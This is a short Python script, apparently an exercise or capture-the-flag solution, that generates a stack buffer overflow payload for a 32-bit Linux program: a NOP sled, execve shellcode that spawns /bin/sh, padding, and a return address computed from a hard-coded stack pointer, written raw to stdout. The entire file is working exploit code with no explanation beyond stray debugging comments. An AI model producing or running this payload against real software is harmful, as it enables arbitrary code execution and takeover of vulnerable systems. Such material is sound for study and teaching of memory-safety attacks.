import sys
#payload = payload = b'a'*272
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

x = 268
SLED_SIZE = 128

sp = 0xffffd6b0
buf_address = sp - (x + 4)

#print("{0} dooka doo doo doo doo doo doo".format(buf_address==0xffffd5a0))

padding_size = x - (SLED_SIZE + len(shellcode))
buf_address += int(SLED_SIZE/2)

payload = b'\x90'*SLED_SIZE + shellcode + b'a'*padding_size + buf_address.to_bytes(4, "little")


#print(payload == b'\x90'*128 + shellcode + b'a'*115 + hex(buf_address).encode())
# v = 0xffffd5d0.to_bytes(4, "little")
# print(v)
# print(b'\xd0\xd5\xff\xff' == v)

#shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
#payload = b'\x90'*128 + shellcode + b'a'*115 + v



sys.stdout.buffer.write(payload)


